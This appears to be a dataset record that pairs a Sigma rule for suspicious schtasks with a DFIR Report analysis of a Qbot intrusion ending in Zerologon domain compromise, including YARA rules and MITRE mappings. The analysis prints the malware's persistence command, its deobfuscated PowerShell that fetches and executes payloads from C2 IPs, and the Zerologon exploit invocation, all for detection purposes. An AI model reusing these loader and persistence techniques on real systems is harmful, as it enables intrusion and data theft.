https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml\n\n### Yara\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-02-20\n   Identifier: Case 8734\n   Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule qbot_8734_payload_dll {\n   meta:\n      description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2022-02-20\"\n      hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n   strings:\n      $s1 = \"Terfrtghygine.dll\" fullword ascii\n      $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */\n      $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */\n      $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */\n      $s5 = \"PQVW=!?\" fullword ascii\n      $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */\n      $s8 = \"CreatePaint\" fullword ascii\n      $s9 = \"PQRVW=2\\\"\" fullword ascii\n      $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */\n      $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */\n      $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */\n      $s14 = \"PQRVW=g\" fullword ascii\n      $s15 = \"PQRW=e!\" fullword ascii\n      $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */\n      $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */\n      $s18 = \"PQRVW=$\" fullword ascii\n      $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */\n      $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them )\n}\n\nrule qbot_dll_8734 {\n   meta:\n      description = \"files - qbot.dll\"\n      author = \"TheDFIRReport\"\n      reference = \"QBOT_DLL\"\n      date = \"2021-12-04\"\n      hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\"\n   strings:\n      $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide\n      $s2 = \"IDAPI32.DLL\" fullword ascii\n      $s3 = \"ResetUsageDataActnExecute\" fullword ascii\n      $s4 = \"idapi32.DLL\" fullword ascii\n      $s5 = \"ShowHintsActnExecute\" fullword ascii\n      $s6 = \"OnExecute@iG\" fullword ascii\n      $s7 = \"OnExecutexnD\" fullword ascii\n      $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii\n      $s9 = \"ResetActnExecute \" fullword ascii\n      $s10 = \"RecentlyUsedActnExecute\" fullword ascii\n      $s11 = \"LargeIconsActnExecute\" fullword ascii\n      $s12 = \"ResetActnExecute\" fullword ascii\n      $s13 = \"OnExecute<\" fullword ascii\n      $s14 = \"TLOGINDIALOG\" fullword wide\n      $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii\n      $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */\n      $s17 = \"LoginPrompt\" fullword ascii\n      $s18 = \"TLoginDialog\" fullword ascii\n      $s19 = \"OnLogin\" fullword ascii\n      $s20 = \"Database Login\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 3000KB and\n      8 of the\n```\n\n## MITRE\n\n- Exploitation for Privilege Escalation – T1068\n- Service Execution – T1569.002\n- Network Share Discovery – T1135\n- Pass the Hash – T1550.002\n- PowerShell – T1059.001\n- Windows Command Shell – T1059.003\n- Network Share Discovery – T1135\n- Obfuscated Files or Information – T1027\n- Scheduled Task – T1053.005\n- Process Injection – T1055\n- Remote System Discovery – T1018\n- Obfuscated Files or Information – T1027\n- Domain Trust Discovery – T1482\n- Domain Groups – T1069.002\n- System Owner/User Discovery – T1033\n- Network Share Discovery – T1135\n- Remote Services – T1021\n- Local Account – T1087.001\n- Security Software Discovery – T1518.001\n\n```image\nAlt: MITRE ATT&CK\nDescription: The image is a flowchart detailing the relationships and tactics used in a cyber attack scenario involving Qbot and Zerologon. It is structured according to the MITRE ATT&CK framework, illustrating various tactics and techniques such as initial access, execution, privilege escalation, lateral movement, discovery, command and control, and exfiltration. Each tactic is accompanied by specific techniques and associated tools, such as Cobalt Strike, PowerShell, and others. The flowchart visually organizes these components, highlighting how they connect to lead to a full domain compromise.\nTranscription: |\n  TA0001: Initial Access\n      T1566.001: Phishing: Spearphishing Attachment -> Qbot\n  \n  TA0002: Execution\n      T1059.001: Command and Scripting Interpreter: PowerShell\n      T1059.003: Command and Scripting Interpreter: Windows Command Shell -> Cobalt Strike\n      T1569: System Services\n  \n  TA0004: Privilege Escalation\n      T1078.002: Valid Accounts: Domain Accounts\n      T1086: Exploitation for Privilege Escalation -> Zerologon\n  \n  TA0005: Defense Evasion\n      T1055: Process Injection -> Cobalt Strike\n  \n  TA0003: Persistence\n      T1053.005: Scheduled Task/Job: Scheduled Task\n  \n  TA0008: Lateral Movement\n      T1021.002: Remote Services: SMB/Windows Admin Shares -> Cobalt Strike\n      T1021.001: Remote Services: Remote Desktop Protocol\n  \n  TA0007: Discovery\n      T1518.001: Software Discovery: Security Software Discovery -> wmic\n      T1018: Remote System Discovery -> Ping\n      T1087.002: Account Discovery: Domain Account -> ADFind\n      T1135: Network Share Discovery -> Net View\n      T1069.001: Permission Groups Discovery: Local Groups\n      T1069: Permission Groups Discovery: Domain Groups -> Net Group\n      T1482: Domain Trust Discovery -> Ntest\n  \n  TA0011: Command and Control\n      T1071: Application Layer Protocol -> Cobalt Strike and Qbot\n  \n  TA0010: Exfiltration\n      T1041: Exfiltration over C2 Channel -> Documents from File Share Server and Cobalt Strike\n```",
    "sigma_rule": {
      "title": "Suspicious Schtasks Execution AppData Folder",
      "id": "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
      "status": "test",
      "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "pH-T (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-03-15",
      "modified": "2022-07-28",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1053.005",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains|all": [
            "/Create",
            "/RU",
            "/TR",
            "C:\\Users\\",
            "\\AppData\\Local\\"
          ],
          "CommandLine|contains": [
            "NT AUT",
            " SYSTEM "
          ]
        },
        "filter": {
          "ParentImage|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "TeamViewer_.exe"
          ],
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": "/TN TVInstallRestore"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_appdata_local_system.yml",
    "id": "470"
  },
  {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise\n\n**Categories:** adfind, cobaltstrike, Qbot\n\n**Published on:** February 21, 2022\n\nIn this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware.\n\nSoon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network.\n\n### Summary\n\nThe threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user.\n\nFollowing the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task’s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes.\n\nOnce the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as `Nltest`, `net`, and `ADFind`.\n\nUpon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named `cool.exe` resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations.\n\nThe domain admin hash was then used on the beachhead through an over-pass-the-hash attack. After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.\n\nFinally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS). To conclude this case, the threat actors were evicted from the network before they completed any further objectives.\n\n### Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Qbot and Zerologon Lead To Full Domain Compromise\nDescription: The image is a detailed timeline chart illustrating the sequence of events related to Qbot and Zerologon vulnerabilities leading to a full domain compromise. It outlines specific timestamps and activities, such as the execution of Qbot DLL, Cobalt Strike discovery, and various network and service interactions. The chart includes commands and actions taken during the attack, making it a comprehensive reference for understanding the progression of the compromise.\nTranscription: |\n  Qbot and Zerologon Lead To Full Domain Compromise\n  \n  16:31 UTC Initial Qbot DLL execution on Beachhead\n      rundll32.exe C:\\Users\\[REDACTED] e2bc6949442adc97345ac811d345f68a386 2laad3c7ae2740a8fa582987.dll,#1\n  \n  16:37 First Qbot C2 activity and discovery activity\n      net localgroup, net share, net view /all, netstat -nao, rout print, ...\n  \n  16:40 DLL dropped by Qbot\n  \n  16:40 Scheduled task created for persistence\n      base64 encoded PowerShell script executed every 30 minutes\n  \n  16:46 C2 begins - Cobalt Strike\n      5.255.98.144:8888\n      dxabt.com\n  \n  17:00 Cobalt Strike discovery\n      nltest.exe /domain_trusts\n      nltest.exe /all_trusts\n      net group \"domain admins\" /domain\n      net group \"domain controllers\" /domain\n      ping -n 1 DOMAINCONTROLLER\n  \n  17:03 ZeroLogon exploit on the first Domain Controller\n      Password of DC was changed\n      Service was installed on the DC\n  \n  17:10 Cobalt Strike Beacon via service installation on the Domain Controller\n  \n  17:12 ADFind discovery from Beachhead\n      find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  \n  17:12 Over-Pass-The-Hash performed with DA hash on Beachhead\n  \n  17:15 Cobalt Strike Beacon via service installation on another Domain Controller\n  \n  17:31 Security software discovery + Ping + ADFind on the second Domain Controller\n      cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /Value\n      cmd.exe /C C:\\[REDACTED]\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\\[REDACTED]\\ce.csv\n      cmd.exe /C ping -n 1 SERVER\n  \n  17:35 UTC Cobalt Strike Beacon via service installation on a file server\n  \n  17:37 UTC RDP connection from BeachHead to Domain Controller and a file server\n  \n  17:56 UTC Alerts triggered from canary document indicating open from Host at IP 91.192.182.[*]165\n```\n\n### Initial Access\n\nThe threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here.\n\nThe execution chain for this QBot infection can be seen below:\n\n```image\nAlt: Qbot Chain\nDescription: The image depicts a detailed execution chain for a Qbot infection. It outlines the steps taken by the malware, starting with the execution of a malicious DLL via 'rundll32.exe'. It shows the injection process into 'explorer.exe' and subsequent connections to two IP addresses, along with the execution of various discovery commands. The steps are categorized into Execution, Discovery, Defense Evasion, and Command and Control, with a legend indicating the color-coding for each category. The image provides specific command line instructions and paths used during the infection process.\nTranscription: |\n  rundll32.exe C:\\Users\\<redacted>\\Downloads\\e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987.dll, #1\n  \n  1. starts & injects into:\n     - C:\\Windows\\SysWOW64\\explorer.exe\n  \n  2. connects to:\n     - 41.228.22.180:443\n     - 24.229.150.54:995\n  \n  3. Runs discovery commands:\n     - whoami /all\n     - net view /all\n     - netstat -ano\n     - cmd /c set\n     - net share\n     - net localgroup\n     - ipconfig /all\n     - route print\n     - arp -a\n     - nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.<redacted>\n  \n  4. Executes:\n     - regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxkgymyv.dll\"\n     - schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa)))\" /SC MINUTE /MO 30\n```\n\n### Execution\n\n#### QBot PowerShell analysis\n\nWe analyzed the registry path and associated keys that were queried by the scheduled task `HKCU:\\SOFTWARE\\Pvoeooxf` and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in:\n\n1. Copy of QBot DLL\n2. String of QBot C2 IP-addresses separated by a semicolon.\n3. Obfuscated PowerShell script that is referenced by the scheduled task.\n\n```image\nAlt: PowerShell Script\nDescription: The image displays a screenshot of a Windows Registry Editor window, showcasing three registry entries. Each entry has a value name, value type, and data. The entries appear to contain base64 encoded information, likely related to the QBot malware, as indicated by the context provided. The data represents encoded values that could be associated with the malware's configuration or payloads.\n```\n\nThe PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:\n\n```image\nAlt: PowerShell Chain\nDescription: The image is a flowchart depicting the execution process of a PowerShell script related to QBot malware. It outlines the steps that occur after the script is triggered by a scheduled task. The flowchart includes key decision points, such as validating the registry key creation date, and actions taken based on whether the date is less than or greater than four hours. It highlights two possible paths: executing a local QBot payload or fetching a remote QBot payload. Each step illustrates commands and processes, such as using 'regsvr32.exe' for DLL execution and 'Start-Process' for executing various types of payloads.\nTranscription: |\n  1. Start PowerShell script via Scheduled task\n     └── 2. Validate registry-key creation date\n         ├── < 4 hours\n         │   └── 3. Execute local Qakbot payload in registry\n         │       └── regsvr32.exe $env:temp/<random>.dll\n         └── > 4 hours\n             └── 3. Fetch remote Qakbot payload\n                 └── https://QbotIP/zk?r=n=kfdopi828182\n                     ├── regsvr32.exe $env:temp/<random>.dl\n                     ├── Start-Process $env:temp/<random>.exe\n                     ├── IEX(payload)\n                     └── cmd /c payload\n                     ├── Start-Process $env:temp/<random>.bat\n                     └── Start-Process $env:temp/<random>.vbs\n```\n\nWhen run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a section of PowerShell script code. It includes a function named 'EjSok()', which retrieves an item property from a specified registry path. The script checks if the registry entry exists and retrieves the date associated with it. It also contains logic to determine if the current date exceeds a threshold of four hours from the retrieved date. The code highlights operations related to registry manipulation and date comparisons, relevant to the analysis of malware behavior.\nTranscription: |\n  function EjSok() {\n      $XtqpDJ = (Get-ItemProperty -Path $tvDQBlr).$WQudUrNwDr\n      if (! $XtqpDJ) {\n          return 1\n      }\n      $vRONdfU = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XtqpDJ))\n      $JfKiixa = Get-Date -Date $vRONdfU\n      $JfKiixa = $JfKiixa.AddHours(4)\n      if ((Get-Date) -gt $JfKiixa) {\n      }\n      return 2\n  }\n```\n\nBased on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.\n\n```image\nAlt: Qbot Payload\nDescription: The image displays a snippet of PowerShell code related to the execution of a malicious DLL. The code includes functions and commands for generating random file names, retrieving encoded data from the Windows Registry, decoding it from base64 format, and executing the DLL using 'regsvr32.exe'. This snippet is part of a larger analysis of the QBot malware's behavior and demonstrates the technical details involved in its execution.\nTranscription: |\n  function UQTV()\n  {\n      $MvmmBxnVj0 = Get-Random\n      $RBnYwaG = (Get-ItemProperty -Path $tvDQbLr).$LngwgFRytJ\n      if ($RBnYwaG) {\n          $_f_zhkPw = \"$env:TEMP\\($MvmmBxnVj0)1.dll\"\n          $fPsS = [System.Convert]::FromBase64String($RBnYwaG)\n          [System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n      }\n  }\n```\n\nOR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the `Invoke-WebRequest` PowerShell module:\n\n```image\nAlt: Invoke-WebRequest\nDescription: The image depicts a snippet of PowerShell code, which is part of a function that initiates a web request to a dynamically constructed URL. The code includes variables for the URL and utilizes the `Invoke-WebRequest` cmdlet to fetch content, with error handling for different response headers. This script is relevant to the analysis of QBot malware, highlighting the method of retrieving payloads via command-and-control (C2) infrastructure.\nTranscription: |\n  function __NOxzyOQT([string]$RGNDm)\n  {\n      $ekanByiPK = \"https://$($RGNDm)$($d_IP)?n=$($PgZYjDK)\"\n      try\n      {\n          $kArvTQZY = Invoke-WebRequest -UseBasicParsing -Uri $ekanByiPK -DisableKeepAlive\n          $zCdUzfmhD = $kArvTQZY.StatusCode\n          if ($kArvTQZY.Headers.'Content-Type') {\n              $JACjQ = $kArvTQZY.Content\n          } else {\n              $JACjQ = [System.Text.Encoding]::ASCII.GetString($kArvTQZY.Content)\n          }\n      }\n  }\n```\n\nThe PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.\n\n```image\nAlt: Payload Execution\nDescription: The image displays a segment of PowerShell script code, showcasing various commands and functions used for executing payloads associated with the QBot malware. The code includes base64 decoding, file writing operations, and process execution commands, indicating a malware execution chain that retrieves and runs encoded malicious files. Specific variables and methods are highlighted, demonstrating the technical aspects of the malware's functionality.\nTranscription: |\n  switch ($UMMtDg[0])\n  {\n      0 {\n      }\n      1 {\n      }\n      2 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).dll\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$($hHlJSNzeM)\"\n      }\n      3 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).exe\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      4 {\n          $BpLv = IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2])))\n      }\n      5 {\n          $geLrhCE = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          Start-Process cmd.exe \"/c $geLrhCE\"\n      }\n      6 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).bat\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      7 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).vbs\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n  }\n```\n\nThe encoded QBot DLL that was stored in the registry, was dropped in the directory `%APPDATA%\\Roaming\\Microsoft\\Fdopitcu`. The unsigned DLL, with descriptor `Cancel Autoplay 2` was executed using `regsvr32.exe`.\n\n```image\nAlt: DLL Execution\nDescription: The image displays a Windows security audit log entry with details about a new process creation event. Key information included in the log are the Event Code, Process IDs, and the command line used for executing the 'regsvr32.exe' process. The log details the security and account information of the creator and target subjects, as well as the process information, including the parent process 'explorer.exe' and the specific command executed. This information is relevant for understanding the execution context of the QBot malware.\nTranscription: |\n  LogName: Security\n  EventCode: 4688\n  EventType: 0\n  ComputerName: <redacted>\n  SourceName: Microsoft Windows security auditing.\n  Type: Information\n  RecordNumber: 38489\n  Keywords: Audit Success\n  TaskCategory: Process Creation\n  OpCode: Info\n  Message: A new process has been created.\n  \n  Creator Subject:\n      Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n      Account Name: <redacted>\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name:\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1758\n      New Process Name: C:\\Windows\\SysWOW64\\regsvr32.exe\n      Token Elevation Type: %%1936\n      Mandatory Label:\n      Creator Process ID: 0x1958\n      Creator Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Process Command Line: regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxgymv.dll\"\n```\n\nUpon execution of this second-stage DLL, various registry keys were created in `HKCU\\Software\\Microsoft\\Yerqbqokc`. In addition, a new instance of explorer.exe (32-bit) was started and injected into.\n\n```image\nAlt: Registry Keys\nDescription: The image depicts a flowchart illustrating the relationship between various registry keys and processes involved in the execution of a malicious DLL within a cybersecurity context. It shows multiple registry paths under 'HKCU\\\\Software\\\\Microsoft\\\\Yerqbqokc' highlighted in yellow, indicating their relevance to the QBot malware analysis. Additionally, the flowchart connects the `regsvr32.exe` process (with PID 2988) and the `explorer.exe` process (with PID 3916), indicating that `regsvr32.exe` loads a DLL from a specified user directory, which subsequently creates the `explorer.exe` process. The diagram serves to visualize the malware's behavior through registry manipulation and process execution.\nTranscription: |\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\e519a231\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\17737aec\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\d086727f\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\683a151a\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\15325a90\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\ad8e3df5\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\afcf1d89\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\9a50cdc7\n  \n  [1] regsvr32.exe (PID: 2988)\n  [2] explorer.exe (PID: 3916)\n  \n  2656 LOADS\n  852 CREATE PROCESS\n  \n  C:\\Users\\***\\qwrfkxgymyv.dll\n```\n\nThe registry keys contain eight-character long hex strings for which we believe is part of the malware’s encrypted config.\n\n```image\nAlt: Registry Config\nDescription: The image displays a table with several columns related to Windows Registry entries. The columns include 'Value Name,' 'Value Type,' 'Data,' and 'Value Slack.' Each row represents a different registry key, showing various hexadecimal string values encoded in 'Data,' which are presumably linked to malware behavior. The 'Value Type' consistently lists 'RegBinary,' indicating the data is stored in binary form.\nTranscription: |\n  | Value Name | Value Type | Data                                                | Value Slack          |\n  | ---------- | ---------- | --------------------------------------------------- | -------------------- |\n  | sC5d6043   | RegBinary  | 61-06-2A-56-B2-94-BD-EA-F3-67-29-9F-3F-56-EB-17-... | 6F-66                |\n  | d05d20d0   | RegBinary  | 66-5C-5D-D0-3D-87-F6-1F-91-2A-54-33-4C-32-7...      | 00                   |\n  | d2139071   | RegBinary  | 6A-FF-71-4B-8D-8C-F7-3E-6B-11-F0-BD-8B-BA-...       | 00-80-68-46-09-00    |\n  | 6aaff714   | RegBinary  | AF-64-9B-02-05-AD-10-D5-45-28-C9-C5-8C-8...         | 00-53-00-68-00       |\n  | 17a7b89e   | RegBinary  | 26-13-19-3A-7C-1A-7F-24-7E-27-4F-27-...             | 00-00-00             |\n  | af1bdfb    | RegBinary  | 3B-8A-29-64-80-9A-64-80-9A-2D-CE-F8-2A-...          | 00-54-79-70-65-00    |\n  | 9a840fb5   | RegBinary  | 35-AE-8D-F6-9D-ED-47-D4-89-FB-6B-39-F8-...          | 00-18-87-09-00       |\n  | a8b5884b   | RegBinary  | 46-A7-DC-1B-3C-7A-93-7A-2D-7A-3A-...                | 45-00                |\n  | 574a6093   | RegBinary  | 38-4C-32-4C-2E-8C-52-2E-8B-44-18-1C-...             | 24-30-23-39-27-C9-42 |\n  | 45ffc7fd   | RegBinary  | EA-6A-32-4C-4E-2B-4E-2B-44-18-1C-10-D...            | 00-00-00             |\n  | 609490a1   | RegBinary  | 1A-25-2B-51-7F-15-BF-49-AF-39-42-...                | 34                   |\n  | 38f780f7   | RegBinary  | 6E-5B-7F-15-18-F5-1F-49-AF-39-42-...                | 34                   |\n  | 8831a05b   | RegBinary  | A6-9F-61-78-B6-72-0D-20-9A-B3-50-29-E5-EC-1E-BB...  | 34                   |\n```\n\n### Persistence\n\n#### Scheduled Task/Job – Scheduled Task On Beachhead\n\nThe scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.\n\n```\nschtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image is a screenshot of a Windows Task Scheduler log entry detailing the registration of a scheduled task. It includes specific fields such as LogName, EventCode, EventType, ComputerName, User, Type, RecordNumber, and a message indicating that a user registered a scheduled task with a unique identifier. This information is relevant to understanding the persistence mechanism utilized by Qbot malware.\nTranscription: |\n  LogName: Microsoft-Windows-TaskScheduler/Operational\n  EventCode: 106\n  EventType: 4\n  ComputerName: <REDACTED>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-TaskScheduler\n  Type: Information\n  RecordNumber: 2717\n  Keywords: None\n  TaskCategory: Task registered\n  OpCode: Info\n  Message: User <REDACTED> registered Task Scheduler task \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\"\n```\n\n```\nLogName: Microsoft-Windows-TaskScheduler/Operational\nEventCode: 106\nMessage: Task scheduler Task Registered\n```\n\n### Privilege Escalation\n\nThirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\n\nThe executable was named “cool.exe”:\n\n```\nC:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n```\n\n```image\nAlt: cool.exe\nDescription: |\n  The image is a screenshot of a command-line interface displaying details about a process executed on a Windows system. It includes the\n  - UtcTime: timestamp of the event\n  - ProcessGuid: unique identifier of the process\n  - ProcessId: identifier number of the running process\n  - Image: path to the executable file (cmd.exe)\n  - Description: indicates it is the Windows Command Processor\n  - CommandLine: shows the command used to run the executable, which includes the path to cmd.exe, the execution of 'cool.exe', and a command to terminate explorer.exe.\n  - It also displays placeholders for the Domain Controller IP, Domain name, and Administrator credentials used in the command. This image is relevant to the context, providing technical insights into the process involved in the exploit.\nTranscription: |\n  UtcTime:\n  ProcessGuid: {6634681a-92da-6192-a412-000000000500}\n  ProcessId: 8672\n  Image: C:\\Windows\\SysWOW64\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n  CurrentDirectory:\n```\n\nThree milliseconds after the Zerologon exploit, an event 4742 “A computer account was changed.” was generated on the targeted Domain Controller.\n\nAs explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV:\n\n> “In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield 